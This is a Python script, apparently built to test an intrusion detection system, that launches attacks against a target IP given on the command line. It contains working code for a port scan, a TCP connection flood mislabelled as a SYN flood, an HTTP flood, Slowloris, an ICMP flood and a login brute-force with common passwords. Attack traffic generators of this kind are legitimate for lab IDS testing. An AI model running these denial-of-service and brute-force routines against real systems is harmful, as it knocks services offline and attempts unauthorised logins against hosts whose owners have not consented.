#!/usr/bin/env python3
"""
Python-based attack scripts for IDS testing
These attacks are designed to trigger IDS detection
"""

import socket
import sys
import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.100.4"  # IDS VM IP
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5001

def attack_port_scan():
    """Port scan attack - should trigger 'port_scan' detection"""
    print("\n" + "="*50)
    print("ATTACK: Port Scan (Should detect 'port_scan')")
    print("="*50)
    
    common_ports = [20, 21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 
                    993, 995, 1433, 3000, 3306, 3389, 5000, 5173, 5432, 6379, 8000, 8080, 27017]
    
    open_ports = []
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((TARGET, port))
            if result == 0:
                open_ports.append(port)
                print(f"  Port {port}: OPEN")
            sock.close()
        except:
            pass
    
    print(f"\n✅ Port scan complete. Found {len(open_ports)} open ports.")
    print("   Check IDS dashboard for 'port_scan' detection.")
    return open_ports

def attack_syn_flood():
    """SYN flood attack - should trigger 'dos' detection"""
    print("\n" + "="*50)
    print("ATTACK: SYN Flood (Should detect 'dos')")
    print("="*50)
    print(f"Sending SYN packets to {TARGET}:{PORT}...")
    print("Press Ctrl+C to stop after 30 seconds")
    
    sockets = []
    start_time = time.time()
    count = 0
    
    try:
        while time.time() - start_time < 30:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((TARGET, PORT))
                sockets.append(s)
                count += 1
                if count % 100 == 0:
                    print(f"  Sent {count} SYN packets...")
            except:
                pass
            time.sleep(0.01)
    except KeyboardInterrupt:
        pass
    finally:
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    print(f"\n✅ SYN flood complete. Sent {count} packets.")
    print("   Check IDS dashboard for 'dos' detection.")

def attack_http_flood():
    """HTTP flood attack - should trigger 'dos' detection"""
    print("\n" + "="*50)
    print("ATTACK: HTTP Flood (Should detect 'dos')")
    print("="*50)
    print(f"Sending 2000 HTTP requests to {TARGET}:{PORT}...")
    
    url = f"http://{TARGET}:{PORT}/"
    count = 0
    
    def send_request(i):
        try:
            requests.get(url, timeout=2)
            return 1
        except:
            return 0
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(send_request, i) for i in range(2000)]
        for future in futures:
            count += future.result()
            if count % 200 == 0:
                print(f"  Sent {count} requests...")
    
    print(f"\n✅ HTTP flood complete. Sent {count} requests.")
    print("   Check IDS dashboard for 'dos' detection.")

def attack_slowloris():
    """Slowloris attack - should trigger 'dos' detection"""
    print("\n" + "="*50)
    print("ATTACK: Slowloris (Should detect 'dos')")
    print("="*50)
    print(f"Opening slow connections to {TARGET}:{PORT}...")
    
    sockets = []
    
    def create_slow_connection(i):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET, PORT))
            s.send(f"GET /?{i} HTTP/1.1\r\n".encode())
            s.send(f"Host: {TARGET}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0\r\n".encode())
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
            sockets.append(s)
            print(f"  Connection {i} established")
        except Exception as e:
            print(f"  Connection {i} failed: {e}")
    
    # Create 200 slow connections
    threads = []
    for i in range(200):
        t = threading.Thread(target=create_slow_connection, args=(i,))
        t.start()
        threads.append(t)
        time.sleep(0.1)
    
    print(f"\n✅ Slowloris attack started. Keeping {len(sockets)} connections open...")
    print("   Keeping connections open for 30 seconds...")
    print("   Check IDS dashboard for 'dos' detection.")
    
    time.sleep(30)
    
    # Close connections
    for s in sockets:
        try:
            s.close()
        except:
            pass
    
    print("✅ Slowloris attack complete.")

def attack_icmp_flood():
    """ICMP ping flood - should trigger 'dos' detection"""
    print("\n" + "="*50)
    print("ATTACK: ICMP Ping Flood (Should detect 'dos')")
    print("="*50)
    print(f"Sending 1000 ICMP packets to {TARGET}...")
    
    import subprocess
    
    try:
        # Use ping command
        subprocess.run(['ping', '-c', '1000', '-f', TARGET], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
    except:
        # Fallback: send raw ICMP packets
        for i in range(1000):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.sendto(b'ping', (TARGET, 0))
                sock.close()
            except:
                pass
            if i % 100 == 0:
                print(f"  Sent {i} ICMP packets...")
    
    print("\n✅ ICMP flood complete.")
    print("   Check IDS dashboard for 'dos' detection.")

def attack_brute_force():
    """Simulated brute force - should trigger 'r2l' or 'brute_force' detection"""
    print("\n" + "="*50)
    print("ATTACK: Brute Force Simulation (Should detect 'brute_force')")
    print("="*50)
    print(f"Simulating login attempts to {TARGET}:{PORT}...")
    
    url = f"http://{TARGET}:{PORT}/api/auth/login"
    common_passwords = ["admin", "password", "123456", "root", "test", "admin123"]
    
    for i, pwd in enumerate(common_passwords * 50):  # 300 attempts
        try:
            requests.post(url, json={"email": "admin@test.com", "password": pwd}, timeout=1)
        except:
            pass
        if i % 50 == 0:
            print(f"  Attempted {i} logins...")
    
    print("\n✅ Brute force simulation complete.")
    print("   Check IDS dashboard for 'brute_force' detection.")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 python_attacks.py <target-ip> [port] [attack-type]")
        print("\nAttack types:")
        print("  scan       - Port scan")
        print("  syn        - SYN flood")
        print("  http       - HTTP flood")
        print("  slowloris  - Slowloris attack")
        print("  icmp       - ICMP flood")
        print("  brute      - Brute force simulation")
        print("  all        - Run all attacks")
        sys.exit(1)
    
    attack_type = sys.argv[3] if len(sys.argv) > 3 else "all"
    
    print("="*50)
    print("IDS Attack Scripts - Python Edition")
    print(f"Target: {TARGET}:{PORT}")
    print("="*50)
    
    if attack_type == "scan":
        attack_port_scan()
    elif attack_type == "syn":
        attack_syn_flood()
    elif attack_type == "http":
        attack_http_flood()
    elif attack_type == "slowloris":
        attack_slowloris()
    elif attack_type == "icmp":
        attack_icmp_flood()
    elif attack_type == "brute":
        attack_brute_force()
    elif attack_type == "all":
        attack_port_scan()
        time.sleep(5)
        attack_syn_flood()
        time.sleep(5)
        attack_http_flood()
        time.sleep(5)
        attack_slowloris()
        time.sleep(5)
        attack_icmp_flood()
        time.sleep(5)
        attack_brute_force()
        print("\n" + "="*50)
        print("✅ All attacks completed!")
        print("Check your IDS dashboard for all detections.")
        print("="*50)
    else:
        print(f"Unknown attack type: {attack_type}")
        sys.exit(1)

if __name__ == "__main__":
    main()

